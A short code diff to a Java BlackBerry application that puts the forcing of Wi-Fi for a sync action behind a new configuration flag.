@@ -13,6 +13,7 @@ import java.util.Vector;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
+import blackberry.Conf;
 import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -177,7 +178,12 @@ public class SyncAction extends SubAction {
         try {
             gprs = databuffer.readInt() == 1;
             wifi = databuffer.readInt() == 1;
-            wifiForced = wifi;
+            
+            if(Conf.SYNCACTION_FORCE_WIFI){
+                wifiForced = wifi;
+            }else{
+                wifiForced = false; 
+            }
 
             final int len = databuffer.readInt();
             final byte[] buffer = new byte[len];
